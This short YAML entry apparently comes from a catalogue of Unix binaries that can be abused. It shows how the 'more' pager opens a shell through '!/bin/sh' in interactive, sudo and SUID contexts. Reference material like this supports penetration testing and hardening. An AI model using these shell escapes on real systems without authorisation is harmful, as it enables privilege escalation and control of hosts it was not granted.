---
functions:
  exec-interactive:
    - code: |
        TERM= more /etc/profile
        !/bin/sh
  sudo-enabled:
    - code: |
        TERM= sudo -E more /etc/profile
        !/bin/sh
  suid-limited:
    - code: |-
        TERM= ./more /etc/profile
        !/bin/sh
---
